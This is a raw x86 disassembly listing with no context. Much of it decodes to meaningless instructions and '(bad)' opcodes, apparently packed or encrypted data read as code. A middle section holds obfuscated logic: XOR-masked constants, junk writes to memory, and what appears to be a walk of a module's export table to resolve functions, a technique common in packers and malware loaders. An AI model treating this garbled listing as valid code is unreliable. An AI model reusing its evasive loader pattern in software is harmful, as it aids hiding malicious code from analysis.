  40635e:	scas   eax,DWORD PTR es:[edi]
  40635f:	in     al,dx
  406360:	mov    ebx,0x50750769
  406365:	xchg   edx,eax
  406366:	addps  xmm0,XMMWORD PTR [esi+ecx*8+0x4b0bb3d5]
  40636e:	push   esi
  40636f:	xchg   edx,eax
  406370:	cmp    eax,0x1841b305
  406375:	call   0x545a827d
  40637a:	ret    0xf267
  40637d:	lods   al,BYTE PTR ds:[esi]
  40637e:	pop    esp
  40637f:	cs leave 
  406381:	push   edx
  406382:	push   esi
  406383:	ret    0x391a
  406386:	cdq    
  406387:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406388:	icebp  
  406389:	push   edi
  40638a:	bound  ebx,QWORD PTR [ecx-0x4e8d29e1]
  406390:	aas    
  406391:	(bad)  
  406392:	shr    BYTE PTR [edx],0xeb
  406395:	dec    ebx
  406396:	sbb    al,0x5d
  406398:	retf   
  406399:	sbb    bh,bl
  40639b:	jne    0x4063f1
  40639d:	lahf   
  40639e:	lahf   
  40639f:	mov    eax,ebx
  4063a1:	lea    esi,cs:[edi-0x49]
  4063a5:	jns    0x4063b9
  4063a7:	cmp    BYTE PTR [eax-0x63],ah
  4063aa:	mov    al,ds:0x3b21f4f9
  4063af:	push   ds
  4063b0:	and    al,0x98
  4063b2:	pop    ss
  4063b3:	cmp    al,0x13
  4063b5:	sbb    DWORD PTR [edi-0x9],ecx
  4063b8:	and    ebx,DWORD PTR [ecx]
  4063ba:	pop    ebx
  4063bb:	xchg   edx,eax
  4063bc:	mov    bl,BYTE PTR [ecx-0x702d5bfe]
  4063c2:	sbb    eax,DWORD PTR [eax+0x3ec9ceb3]
  4063c8:	ja     0x4063db
  4063ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063cb:	adc    DWORD PTR [edx-0x2e],ecx
  4063ce:	mov    esi,0xfebf8b74
  4063d3:	fimul  WORD PTR ds:0xe9de359d
  4063d9:	and    al,0x77
  4063db:	push   ss
  4063dc:	loop   0x4063fe
  4063de:	dec    ebx
  4063df:	xor    dh,BYTE PTR [ebx]
  4063e1:	jl     0x406367
  4063e3:	retf   0xed
  4063e6:	and    dl,BYTE PTR [edx+esi*1+0xb418922]
  4063ed:	and    di,sp
  4063f0:	outs   dx,BYTE PTR ds:[si]
  4063f2:	pop    edx
  4063f3:	outs   dx,BYTE PTR ds:[esi]
  4063f4:	pop    ds
  4063f5:	xchg   bl,bh
  4063f7:	mov    eax,0xa59add17
  4063fc:	jns    0x40642f
  4063fe:	ror    BYTE PTR [ebp-0x2bdb6c12],1
  406404:	test   al,0x79
  406406:	pusha  
  406407:	test   eax,0x93387568
  40640c:	test   eax,0x5c5a80e7
  406411:	mov    esi,0xf4e906d6
  406416:	ror    BYTE PTR [esi+0x60960c84],cl
  40641c:	(bad)  
  40641e:	and    ebx,edx
  406420:	sbb    BYTE PTR [ebx-0x515ff701],dh
  406426:	inc    edx
  406427:	(bad)  
  406428:	leave  
  406429:	pop    eax
  40642a:	idiv   BYTE PTR [eax+0x6d3f1daa]
  406430:	and    al,0xb3
  406432:	dec    ebp
  406433:	xchg   DWORD PTR ds:0x5bb32af7,esp
  406439:	outs   dx,BYTE PTR ds:[esi]
  40643a:	popf   
  40643b:	xchg   BYTE PTR ds:0x8d734b3e,al
  406441:	inc    eax
  406442:	(bad)  
  406443:	in     al,0x6e
  406445:	hlt    
  406446:	xchg   esi,eax
  406447:	sbb    BYTE PTR [ebx],bl
  406449:	sub    edx,DWORD PTR [eax+0x3ea91645]
  40644f:	lock rcl BYTE PTR [edi],1
  406452:	int    0xe8
  406454:	fisub  DWORD PTR [edx-0x51833da0]
  40645a:	sbb    al,0x8f
  40645c:	in     eax,dx
  40645d:	jg     0x406445
  40645f:	cmp    edx,esp
  406461:	jmp    0x225d5393
  406466:	cmovnp eax,ecx
  406469:	test   eax,0xb338f535
  40646e:	mov    ah,0x66
  406470:	mov    bh,0xb
  406472:	es ins BYTE PTR es:[edi],dx
  406474:	and    eax,0xd0ad3c83
  406479:	repz test ebp,eax
  40647c:	xchg   ecx,eax
  40647d:	repnz lock xlat BYTE PTR ds:[ebx]
  406480:	imul   ebp,DWORD PTR [edi-0x26],0xffffff93
  406484:	rcl    BYTE PTR [ebx],cl
  406486:	rcl    DWORD PTR [edi],0xa8
  406489:	cmp    dl,BYTE PTR [esi-0x6be7c5bd]
  40648f:	std    
  406490:	mov    esp,0x90c2623b
  406495:	pop    es
  406496:	xor    ah,BYTE PTR [ebx+eax*8]
  406499:	ins    BYTE PTR es:[edi],dx
  40649a:	stc    
  40649b:	inc    esp
  40649c:	pop    esi
  40649d:	addr16 pop ds
  40649f:	fild   WORD PTR [eax+0x1b35465b]
  4064a5:	inc    ebx
  4064a6:	mov    esi,0x7e036a3d
  4064ab:	sub    BYTE PTR [ebp+ebx*8+0x52],al
  4064af:	stos   BYTE PTR es:[edi],al
  4064b0:	int    0x6b
  4064b2:	pop    esi
  4064b3:	adc    DWORD PTR [ebx-0x3],ebx
  4064b6:	jae    0x406524
  4064b8:	iret   
  4064b9:	cwde   
  4064ba:	mov    esi,0xfff9faf4
  4064bf:	sub    eax,0x9f8f2250
  4064c4:	pop    ebp
  4064c5:	cs out dx,eax
  4064c7:	or     eax,0xd913f689
  4064cc:	dec    esi
  4064cd:	mov    esp,0x2ede43a6
  4064d2:	test   eax,0xcd862fca
  4064d7:	je     0x4064c1
  4064d9:	leave  
  4064da:	xchg   ecx,eax
  4064db:	adc    al,0x53
  4064dd:	push   edx
  4064de:	adc    DWORD PTR [ebx],ebp
  4064e0:	push   0xffffffe0
  4064e2:	ficom  DWORD PTR [eax]
  4064e4:	ffreep st(2)
  4064e6:	out    dx,al
  4064e7:	mov    cl,0x40
  4064e9:	lock daa 
  4064eb:	mov    eax,0x56c9260f
  4064f0:	cmp    esi,DWORD PTR ss:0x3d1e778e
  4064f7:	fwait
  4064f8:	add    esp,eax
  4064fa:	ret    0x4f92
  4064fd:	xor    eax,0xf3cbdb25
  406502:	fnstcw WORD PTR [esi+eiz*1]
  406505:	dec    edx
  406506:	push   esi
  406507:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406508:	fwait
  406509:	(bad)  
  40650a:	out    0xf,al
  40650c:	add    BYTE PTR [edx-0x1c],ah
  40650f:	imul   edx,DWORD PTR [eax+eax*1+0x64b12042],0xd3bb0c37
  40651a:	ss fs add al,0x15
  40651e:	mov    ds:0x5c8a3214,al
  406523:	daa    
  406524:	pop    ebp
  406525:	rcl    DWORD PTR [edx+0x21630503],cl
  40652b:	ror    BYTE PTR [ebp-0x56],0xf0
  40652f:	cmp    eax,DWORD PTR [ebx]
  406531:	mov    ecx,0x27f3f7cc
  406536:	arpl   WORD PTR [eax+0x270a83f1],ax
  40653c:	pop    eax
  40653d:	and    bh,al
  40653f:	nop
  406540:	cmovle ebx,DWORD PTR [eax-0x29]
  406544:	push   0xee6c124d
  406549:	shl    BYTE PTR [ecx],0x42
  40654c:	add    al,0xe8
  40654e:	ret    
  40654f:	cld    
  406550:	aas    
  406551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406552:	push   ss
  406553:	mov    ah,BYTE PTR [esi-0x528be132]
  406559:	ret    
  40655a:	push   ebp
  40655b:	inc    ecx
  40655c:	iret   
  40655d:	jno    0x4065a3
  40655f:	inc    esi
  406560:	lds    esp,FWORD PTR [edi+esi*4-0x56]
  406564:	cmp    al,al
  406566:	xchg   ecx,eax
  406567:	mov    esp,esi
  406569:	xor    edx,DWORD PTR [edx]
  40656b:	pop    ebx
  40656c:	nop
  40656d:	push   esi
  40656e:	add    DWORD PTR [edx],ecx
  406570:	push   esi
  406571:	mov    ch,0x47
  406573:	add    esp,DWORD PTR [ebp+0x5]
  406576:	mov    ch,0xdd
  406578:	or     eax,0x6161595
  40657d:	stos   DWORD PTR es:[edi],eax
  40657e:	in     al,dx
  40657f:	call   0x95ae:0xcce70bcd
  406586:	or     al,0xe9
  406588:	dec    esi
  406589:	popf   
  40658a:	jp     0x40656d
  40658c:	mov    dh,BYTE PTR [edi]
  40658e:	nop
  40658f:	adc    BYTE PTR [ebx],al
  406591:	add    eax,0xc2b552fb
  406596:	mov    eax,ds:0x4422f549
  40659b:	out    0x30,eax
  40659d:	mov    ch,0xa2
  40659f:	das    
  4065a0:	inc    esp
  4065a1:	xlat   BYTE PTR ds:[ebx]
  4065a2:	mov    BYTE PTR [ecx+0x40cd9930],ah
  4065a8:	(bad)
  4065ac:	out    dx,al
  4065ad:	ret    0x9f24
  4065b0:	xchg   BYTE PTR [eax+0x25],dl
  4065b3:	push   ds
  4065b4:	xor    dl,dh
  4065b6:	inc    esp
  4065b7:	or     dh,ch
  4065b9:	mov    esi,DWORD PTR ds:0x6d6ba9bf
  4065bf:	lea    eax,[ecx+0x2d081239]
  4065c5:	pop    edi
  4065c6:	es into 
  4065c8:	pop    es
  4065c9:	dec    ebp
  4065ca:	xchg   ebp,eax
  4065cb:	pop    ss
  4065cc:	inc    esi
  4065cd:	sub    edx,DWORD PTR [eax]
  4065cf:	ret    
  4065d0:	push   esi
  4065d1:	sti    
  4065d2:	mov    bh,0x9f
  4065d4:	(bad)
  4065d8:	pop    ecx
  4065d9:	fwait
  4065da:	data16 mov ch,0xfb
  4065dd:	xchg   BYTE PTR [ebx+0xc],bh
  4065e0:	or     DWORD PTR [edi+0x3c],ecx
  4065e3:	shl    esp,0x53
  4065e6:	icebp  
  4065e7:	fnstenv [esi]
  4065e9:	lea    edx,[esi-0x3272db]
  4065ef:	sbb    DWORD PTR ds:0x426000,0x42900c
  4065f9:	xor    ecx,ebx
  4065fb:	xor    DWORD PTR ds:0x425008,0xe68
  406605:	xor    edx,ebx
  406607:	mov    DWORD PTR ds:0x427008,0xa36
  406611:	cmp    edx,ecx
  406613:	mov    DWORD PTR ds:0x425000,0x1171
  40661d:	je     0x40684c
  406623:	mov    ecx,DWORD PTR [ebp-0x4]
  406626:	xor    ecx,ebx
  406628:	adc    DWORD PTR ds:0x427000,0x2a26
  406632:	add    ecx,eax
  406634:	cmp    esi,ecx
  406636:	jne    0x4067ef
  40663c:	push   DWORD PTR [ebp+0x8]
  40663f:	call   0x415b52
  406644:	mov    ecx,DWORD PTR ds:0x41d29c
  40664a:	mov    ecx,DWORD PTR [ecx]
  40664c:	and    DWORD PTR ds:0x42900c,ecx
  406652:	mov    DWORD PTR [ebp-0x18],eax
  406655:	mov    eax,DWORD PTR [ebp-0x4]
  406658:	mov    DWORD PTR ds:0x428018,0x10
  406662:	cmp    DWORD PTR ds:0x428018,0x0
  406669:	je     0x4066c2
  40666f:	cmp    DWORD PTR ds:0x428018,0x7
  406676:	jne    0x406685
  40667c:	push   DWORD PTR [ebp-0x28]
  40667f:	call   DWORD PTR ds:0x421004
  406685:	cmp    DWORD PTR ds:0x428018,0x8
  40668c:	jne    0x40669f
  406692:	mov    edi,DWORD PTR ds:0x428018
  406698:	dec    edi
  406699:	mov    DWORD PTR ds:0x428018,edi
  40669f:	mov    edi,DWORD PTR ds:0x428018
  4066a5:	dec    edi
  4066a6:	mov    DWORD PTR ds:0x428018,edi
  4066ac:	jmp    0x406662
  4066b1:	mov    ecx,DWORD PTR ds:0x41ffff
  4066b7:	mov    edi,DWORD PTR ds:0x41d264
  4066bd:	sub    edi,ecx
  4066bf:	add    ecx,DWORD PTR [ecx+edi*1]
  4066c2:	mov    ecx,DWORD PTR [ebp-0x18]
  4066c5:	xor    eax,ebx
  4066c7:	mov    edi,0x3272db
  4066cc:	add    eax,edi
  4066ce:	mov    DWORD PTR ds:0x425008,0x2bfa
  4066d8:	cmp    ecx,eax
  4066da:	je     0x4068bc
  4066e0:	sbb    DWORD PTR ds:0x426000,0x426010
  4066ea:	push   DWORD PTR [ebp-0x18]
  4066ed:	push   DWORD PTR [ebp+0x8]
  4066f0:	call   0x417fa0
  4066f5:	sbb    DWORD PTR ds:0x42601c,ecx
  4066fb:	mov    DWORD PTR [ebp-0x18],eax
  4066fe:	dec    eax
  4066ff:	mov    eax,DWORD PTR [ebp-0x4]
  406702:	and    DWORD PTR ds:0x425018,0x0
  40670c:	jmp    0x40671e
  406711:	mov    ecx,DWORD PTR ds:0x425018
  406717:	inc    ecx
  406718:	mov    DWORD PTR ds:0x425018,ecx
  40671e:	cmp    DWORD PTR ds:0x425018,0x1e
  406725:	jae    0x40674c
  40672b:	cmp    DWORD PTR ds:0x425018,0x2e
  406732:	jne    0x406741
  406738:	push   DWORD PTR [ebp-0x20]
  40673b:	call   DWORD PTR ds:0x421048
  406741:	jmp    0x406711
  406746:	sbb    ecx,DWORD PTR ds:0x42900c
  40674c:	mov    ecx,DWORD PTR [ebp-0x18]
  40674f:	xor    DWORD PTR ds:0x425000,0x426004
  406759:	xor    eax,ebx
  40675b:	sub    DWORD PTR ds:0x42900c,0x26ad
  406765:	add    eax,edi
  406767:	cmp    ecx,eax
  406769:	mov    DWORD PTR ds:0x42501c,0x148e
  406773:	je     0x4068bc
  406779:	mov    eax,DWORD PTR [ebp-0x18]
  40677c:	mov    eax,DWORD PTR [eax+0x18]
  40677f:	mov    ecx,DWORD PTR ds:0x42500c
  406785:	or     DWORD PTR ds:0x428014,ecx
  40678b:	mov    DWORD PTR [ebp-0x24],eax
  40678e:	mov    eax,DWORD PTR [ebp-0x18]
  406791:	mov    ecx,DWORD PTR [ebp+0x8]
  406794:	add    ecx,DWORD PTR [eax+0x20]
  406797:	mov    DWORD PTR [ebp-0x2c],ecx
  40679a:	and    eax,eax
  40679c:	mov    eax,DWORD PTR [ebp-0x18]
  40679f:	and    ecx,DWORD PTR ds:0x427000
  4067a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4067a8:	adc    DWORD PTR ds:0x425004,0x721
  4067b2:	add    ecx,DWORD PTR [eax+0x24]
  4067b5:	movzx  eax,WORD PTR ds:0x428004
  4067bc:	sbb    eax,DWORD PTR ds:0x42801c
  4067c2:	mov    ds:0x428004,eax
  4067c7:	mov    DWORD PTR [ebp-0x34],ecx
  4067ca:	or     DWORD PTR ds:0x429008,edx
  4067d0:	mov    eax,DWORD PTR [ebp-0x18]
  4067d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4067d6:	sbb    DWORD PTR ds:0x427018,0x427008
  4067e0:	add    ecx,DWORD PTR [eax+0x1c]
  4067e3:	not    eax
  4067e5:	mov    eax,edi
  4067e7:	mov    DWORD PTR [ebp-0x18],ecx
  4067ea:	jmp    0x406884
  4067ef:	movzx  ecx,BYTE PTR ds:0x428010
  4067f6:	add    ecx,DWORD PTR ds:0x42700c
  4067fc:	mov    DWORD PTR ds:0x428010,ecx
  406802:	mov    ecx,DWORD PTR [ebp-0x2c]
  406805:	xor    DWORD PTR ds:0x425004,edi
  40680b:	mov    edx,DWORD PTR [ebp+0x8]
  40680e:	and    DWORD PTR ds:0x425020,0x42901c
  406818:	add    edx,DWORD PTR [ecx+esi*4]
  40681b:	inc    ecx
  40681c:	mov    DWORD PTR [ebp-0x28],edx
  40681f:	sub    DWORD PTR ds:0x425000,ecx
  406825:	mov    ecx,DWORD PTR [ebp-0x4]
  406828:	sbb    DWORD PTR ds:0x42500c,0xc10
  406832:	mov    edx,DWORD PTR [ebp-0x28]
  406835:	xor    ecx,ebx
  406837:	dec    DWORD PTR ds:0x42600c
  40683d:	add    ecx,eax
  40683f:	cmp    edx,ecx
  406841:	je     0x406884
  406847:	jmp    0x406870
  40684c:	mov    ecx,DWORD PTR [ebp-0x4]
  40684f:	mov    edx,DWORD PTR [ebp-0x8]
  406852:	xor    ecx,ebx
  406854:	add    ecx,eax
  406856:	cmp    edx,ecx
  406858:	je     0x4068c8
  40685e:	mov    ecx,DWORD PTR [ebp-0x4]
  406861:	mov    edx,DWORD PTR [ebp-0x30]
  406864:	xor    ecx,ebx
  406866:	add    ecx,eax
  406868:	cmp    edx,ecx
  40686a:	je     0x4068d7
  406870:	lea    eax,[ebp-0x8]
  406873:	push   eax
  406874:	push   DWORD PTR [ebp-0x28]
  406877:	push   DWORD PTR [ebp+0xc]
  40687a:	call   0x401000
  40687f:	mov    eax,0x3272db
  406884:	mov    ecx,DWORD PTR [ebp-0x4]
  406887:	mov    edx,DWORD PTR [ebp-0x8]
  40688a:	xor    ecx,ebx
  40688c:	add    ecx,eax
  40688e:	cmp    edx,ecx
  406890:	je     0x4068ab
  406896:	mov    ecx,DWORD PTR [ebp-0x34]
  406899:	movzx  ecx,WORD PTR [ecx+esi*2]
  40689d:	mov    edx,DWORD PTR [ebp-0x18]
  4068a0:	mov    ecx,DWORD PTR [edx+ecx*4]
  4068a3:	mov    DWORD PTR [ebp-0x38],ecx
  4068a6:	jmp    0x40684c
  4068ab:	mov    ecx,DWORD PTR [ebp-0x14]
  4068ae:	xor    ecx,ebx
  4068b0:	lea    esi,[esi+ecx*1+0x3272db]
  4068b7:	jmp    0x40427f
  4068bc:	mov    eax,DWORD PTR [ebp-0x4]
  4068bf:	xor    eax,ebx
  4068c1:	add    eax,edi
  4068c3:	jmp    0x408d90
  4068c8:	mov    eax,DWORD PTR [ebp-0x4]
  4068cb:	xor    eax,ebx
  4068cd:	add    eax,0x3272db
  4068d2:	jmp    0x408d90
  4068d7:	mov    ecx,DWORD PTR [ebp-0x38]
  4068da:	add    ecx,DWORD PTR [ebp+0x8]
  4068dd:	mov    DWORD PTR [ebp-0x10],ecx
  4068e0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4068e3:	test   ecx,ecx
  4068e5:	je     0x408d1b
  4068eb:	mov    DWORD PTR [ebp-0x20],0x0
  4068f2:	push   0x3
  4068f4:	xor    edx,edx
  4068f6:	pop    edx
  4068f7:	add    edx,0x8
  4068fa:	push   edx
  4068fb:	pop    ecx
  4068fc:	push   0x6
  4068fe:	dec    ecx
  4068ff:	pop    ebx
  406900:	dec    ebx
  406901:	xchg   ebx,ecx
  406903:	sub    ebx,ecx
  406905:	xchg   ebx,ecx
  406907:	dec    ecx
  406908:	mov    eax,DWORD PTR [ebp-0x1c]
  40690b:	imul   eax,ecx
  40690e:	sub    esp,eax
  406910:	mov    DWORD PTR [ebp-0x20],esp
  406913:	mov    eax,DWORD PTR [ebp-0x4]
  406916:	mov    ecx,0x7510893
  40691b:	xor    eax,ecx
  40691d:	mov    edx,0x3272db
  406922:	add    eax,edx
  406924:	mov    DWORD PTR [ebp+0x8],eax
  406927:	mov    eax,DWORD PTR [ebp-0x14]
  40692a:	xor    eax,ecx
  40692c:	add    eax,edx
  40692e:	mov    edx,DWORD PTR [ebp+0x14]
  406931:	imul   eax,DWORD PTR [edx]
  406934:	mov    edx,DWORD PTR [ebp-0x4]
  406937:	xor    edx,ecx
  406939:	mov    ecx,DWORD PTR [ebp+0x8]
  40693c:	lea    ecx,[edx+ecx*1+0x3272db]
  406943:	cmp    ecx,eax
  406945:	je     0x408d11
  40694b:	mov    edi,DWORD PTR [ebp-0x14]
  40694e:	mov    eax,DWORD PTR [ebp+0x8]
  406951:	mov    edx,DWORD PTR [ebp+0x14]
  406954:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  406958:	mov    ecx,0x7510893
  40695d:	xor    edx,edx
  40695f:	xor    edi,ecx
  406961:	mov    esi,0x3272db
  406966:	add    edi,esi
  406968:	div    edi
  40696a:	mov    edx,DWORD PTR [ebp-0x4]
  40696d:	xor    edx,ecx
  40696f:	lea    eax,[edx+eax*1+0x3272db]
  406976:	mov    edx,DWORD PTR [ebp+0x8]
  406979:	mov    edi,DWORD PTR [ebp-0x20]
  40697c:	mov    DWORD PTR [edi+edx*4],eax
  40697f:	mov    eax,DWORD PTR [ebp-0x14]
  406982:	mov    edx,DWORD PTR [ebp+0x8]
  406985:	xor    eax,ecx
  406987:	lea    eax,[eax+edx*1+0x3272db]
  40698e:	mov    DWORD PTR [ebp+0x8],eax
  406991:	mov    eax,DWORD PTR [ebp-0x14]
  406994:	mov    edx,DWORD PTR [ebp+0x14]
  406997:	xor    eax,ecx
  406999:	add    eax,esi
  40699b:	imul   eax,DWORD PTR [edx]
  40699e:	mov    edx,DWORD PTR [ebp-0x4]
  4069a1:	xor    edx,ecx
  4069a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4069a6:	lea    ecx,[edx+ecx*1+0x3272db]
  4069ad:	cmp    ecx,eax
  4069af:	jmp    0x408d04
  4069b4:	into   
  4069b5:	mov    BYTE PTR [ecx],bl
  4069b7:	(bad)  
  4069b8:	adc    esp,DWORD PTR [ebx+0x10b2688d]
  4069be:	shl    DWORD PTR [ebx+0x11],0xed
  4069c2:	dec    ebx
  4069c3:	sub    eax,edx
  4069c5:	cmp    al,0x62
  4069c7:	bound  ebp,QWORD PTR [edx]
  4069c9:	pop    edi
  4069ca:	bound  esp,QWORD PTR [edx+0x7e]
  4069cd:	outs   dx,BYTE PTR ds:[esi]
  4069ce:	ins    DWORD PTR es:[edi],dx
  4069cf:	ret    0x1e0d
  4069d2:	inc    DWORD PTR [ebx+edi*8-0x6c]
  4069d6:	fimul  WORD PTR [ebx]
  4069d8:	or     al,0x9c
  4069da:	lock (bad) 
  4069dc:	jne    0x4069b5
  4069de:	dec    edx
  4069df:	cmp    BYTE PTR ds:0x9a6ec5ca,al
  4069e5:	mov    ch,0xc2
  4069e7:	or     dl,bl
  4069e9:	mov    BYTE PTR [ecx-0x67a309a3],dl
  4069ef:	cdq    
  4069f0:	xchg   edx,eax
  4069f1:	out    dx,al
  4069f2:	add    edi,DWORD PTR [edi]
  4069f4:	xor    edx,DWORD PTR [edi-0x1dee1e3a]
  4069fa:	inc    edx
  4069fb:	dec    ebp
  4069fc:	fimul  DWORD PTR [eax]
  4069fe:	std    
  4069ff:	in     al,0xe3
  406a01:	mov    esi,0x6f468f36
  406a06:	xchg   ecx,eax
  406a07:	xchg   BYTE PTR [esi],al
  406a09:	jmp    0x2699:0x570e8fc5
  406a10:	mov    ds:0xaae4867d,eax
  406a15:	shr    DWORD PTR [ecx+esi*1],cl
  406a18:	mov    ds:0xba9b9ad3,al
  406a1d:	pop    DWORD PTR [edi-0x1455ba28]
  406a23:	push   0x7a
  406a25:	xor    al,0xa6
  406a27:	loopne 0x406a2b
  406a29:	xor    ebp,edi
  406a2b:	mov    al,ds:0xeee81dde
  406a30:	loope  0x406a3d
  406a32:	add    BYTE PTR [edx],0x91
  406a35:	scas   eax,DWORD PTR es:[edi]
  406a36:	rol    DWORD PTR [esi+0x32],0x2c
  406a3a:	and    BYTE PTR [ebp+0x2d41aa08],ch
  406a40:	add    cl,BYTE PTR [ebx-0x2f324cc2]
  406a46:	or     ah,BYTE PTR [ecx]
  406a48:	cwde   
  406a49:	mov    esp,DWORD PTR [ebx+0x2f]
  406a4c:	inc    edx
  406a4d:	jne    0x4069d2
  406a4f:	daa    
  406a50:	int3   
  406a51:	out    0x4f,al
  406a53:	mov    al,ds:0xce1e344b
  406a58:	xor    BYTE PTR [eax-0x459b3ae3],ah
  406a5e:	clc    
  406a5f:	or     eax,0xea8a9244
  406a64:	adc    al,0x8b
  406a66:	jae    0x406a47
  406a68:	outs   dx,DWORD PTR ds:[esi]
  406a69:	fdivr  QWORD PTR [eax-0x61bf6b0f]
  406a6f:	enter  0xbefe,0x68
  406a73:	stos   BYTE PTR es:[edi],al
  406a74:	mov    dh,0xab
  406a76:	sub    al,0x42
  406a78:	aaa    
  406a79:	outs   dx,DWORD PTR ds:[esi]
  406a7a:	enter  0x45e1,0x4
  406a7e:	retf   0x1a37
  406a81:	(bad)  
  406a82:	popf   
  406a83:	or     bl,bl
  406a85:	mov    ecx,DWORD PTR [ecx-0x72]
  406a88:	cmp    dh,dh
  406a8a:	sbb    dl,BYTE PTR [edx-0x7c9657dc]
  406a90:	inc    edx
  406a91:	xor    al,0x52
  406a93:	fdivr  QWORD PTR [edi]
  406a95:	mov    al,ds:0x7095e82e
  406a9a:	push   ecx
  406a9b:	imul   ebx,DWORD PTR [edi+0x4196bfb5],0xffffff91
  406aa2:	pop    ss
  406aa3:	repnz sub BYTE PTR [ebx-0x2],bl
  406aa7:	arpl   WORD PTR [ecx],bx
  406aa9:	aas    
  406aaa:	mov    edi,0xb48dbf39
  406aaf:	and    eax,0xa39e1875
  406ab4:	lock out 0x39,al
  406ab7:	mov    eax,ds:0xa8f8e501
  406abc:	(bad)  
  406abd:	or     BYTE PTR [ecx-0x2f],bl
  406ac0:	(bad)  
  406ac1:	mov    bl,0xe6
  406ac3:	mov    eax,ds:0x851f1b1d
  406ac8:	mov    esp,0x1b717996
  406acd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ace:	mov    al,0xec
  406ad0:	and    DWORD PTR [edi+0x33910163],esp
  406ad6:	hlt    
  406ad7:	imul   esp,DWORD PTR [eax+ebp*4-0x18],0x57ab5276
  406adf:	lods   al,BYTE PTR ds:[esi]
  406ae0:	hlt    
  406ae1:	jge    0x406a7a
  406ae3:	mov    edx,0x150ed042
  406ae8:	ret    0x9281
  406aeb:	js     0x406ac1
  406aed:	cmp    cl,BYTE PTR [edx]
  406aef:	scas   al,BYTE PTR es:[edi]
  406af0:	xlat   BYTE PTR ds:[ebx]
  406af1:	lods   eax,DWORD PTR ds:[esi]
  406af2:	addr16 pushf 
  406af4:	ins    DWORD PTR es:[edi],dx
  406af5:	gs push ebp
  406af7:	mov    al,ds:0xe576e9e7
  406afc:	mov    eax,ds:0x6840a42e
  406b01:	jge    0x406aba
  406b03:	xchg   edi,eax
  406b04:	push   ds
  406b05:	shl    ebx,cl
  406b07:	dec    ebp
  406b08:	adc    al,0x77
  406b0a:	repnz mov DWORD PTR [esi-0x56233b35],edx
  406b11:	in     eax,0x99
  406b13:	ins    BYTE PTR es:[edi],dx
  406b14:	shufps xmm7,XMMWORD PTR [eax+ebp*1-0x46],0xd7
  406b1a:	push   edx
  406b1b:	sbb    bh,BYTE PTR [esi+eax*2-0x1b]
  406b1f:	xor    al,0x30
  406b21:	jb     0x406ab0
  406b23:	xlat   BYTE PTR ds:[ebx]
  406b24:	addr16 xchg ebx,eax
  406b26:	and    bh,BYTE PTR [edi+0x41]
  406b29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b2a:	popf   
  406b2b:	aad    0xa1
  406b2d:	es dec edi
  406b2f:	enter  0x48d0,0x1c
  406b33:	xor    ch,BYTE PTR [edi+0x5b1608a]
  406b39:	jmp    0xf7fb:0xa4a4ac87
  406b40:	xor    eax,0xf2164168
  406b45:	push   ebp
  406b46:	leave  
  406b47:	ins    BYTE PTR es:[edi],dx
  406b48:	jno    0x406b6e
  406b4a:	lods   al,BYTE PTR ds:[esi]
  406b4b:	cli    
  406b4c:	(bad)  
  406b4e:	dec    ebp
  406b4f:	daa    
  406b50:	mov    eax,ds:0x1458adb1
  406b55:	pop    ebp
  406b56:	sbb    edx,DWORD PTR [esp+eiz*4-0x783319dd]
  406b5d:	push   ds
  406b5e:	cmp    DWORD PTR [eax+eiz*1+0x4a],ecx
  406b62:	and    ebx,DWORD PTR [esi-0x25]
  406b65:	ds mov dh,0xb0
  406b68:	xor    eax,0xc29d0ec7
  406b6d:	dec    esp
  406b6e:	xor    bh,BYTE PTR [ebx-0x723d73ed]
  406b74:	pop    eax
  406b75:	adc    esi,esi
  406b77:	rol    DWORD PTR [ebx+esi*4+0x23453cb6],cl
  406b7e:	mov    edi,0xb1752442
  406b83:	test   DWORD PTR [ecx+0x2ff57801],0xa500a865
  406b8d:	add    eax,0x9be546c4
  406b92:	std    
  406b93:	out    0x15,al
  406b95:	adc    al,0xbe
  406b97:	adc    ebp,DWORD PTR [ebx]
  406b99:	aam    0x25
  406b9b:	mov    eax,0xcc25cac
  406ba0:	inc    ebp
  406ba1:	test   esp,eax
  406ba3:	je     0x406bd1
  406ba5:	cmp    BYTE PTR [edi-0x5a],cl
  406ba8:	aad    0xdd
  406baa:	shr    BYTE PTR [esi-0x60e2860d],1
  406bb0:	push   cs
  406bb1:	add    DWORD PTR [ebx-0x1f048be0],edi
  406bb7:	sbb    ch,BYTE PTR [eax]
  406bb9:	adc    al,0x82
  406bbb:	pushf  
  406bbc:	fldenv [esi]
  406bbe:	sub    eax,0x9c77473f
  406bc3:	mov    ds:0x4e590b94,al
  406bc8:	je     0x406c2f
  406bca:	jae    0x406bc4
  406bcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bcd:	or     DWORD PTR [ebx+eiz*8],ecx
  406bd0:	inc    ecx
  406bd1:	jmp    0xef47aedd
  406bd6:	mov    BYTE PTR [edi+0x4d],dh
  406bd9:	jae    0x406c58
  406bdb:	jmp    0x3fed7930
  406be0:	jo     0x406b6b
  406be2:	sbb    esi,esp
  406be4:	xchg   edi,eax
  406be5:	pop    eax
  406be6:	clc    
  406be7:	lea    edx,ds:0x71bc8d81
  406bed:	(bad)  
  406bee:	dec    ecx
  406bf0:	push   edx
  406bf1:	dec    ebp
  406bf2:	fisub  DWORD PTR [ebp+0x5f]
  406bf5:	dec    ebx
  406bf6:	xchg   BYTE PTR [ebp+0x7820112d],ch
  406bfc:	loopne 0x406c58
  406bfe:	pop    ebx
  406bff:	inc    ebp
  406c00:	push   ds
  406c01:	into   
  406c02:	imul   ebx,DWORD PTR [eax-0x42b71e93],0xaa3de875
  406c0c:	xor    BYTE PTR [esi-0x774f38d5],cl
  406c12:	pusha  
  406c13:	mov    bl,0xb0
  406c15:	push   ss
  406c16:	sbb    eax,0x6bf18a9a
  406c1b:	sub    cl,BYTE PTR [edx+0xf685fd1]
  406c21:	call   0xf952:0x98e532e9
  406c28:	mov    bl,0x20
  406c2a:	and    DWORD PTR [esi],ebx
  406c2c:	shr    DWORD PTR [ecx+0x71],0xe2
  406c30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
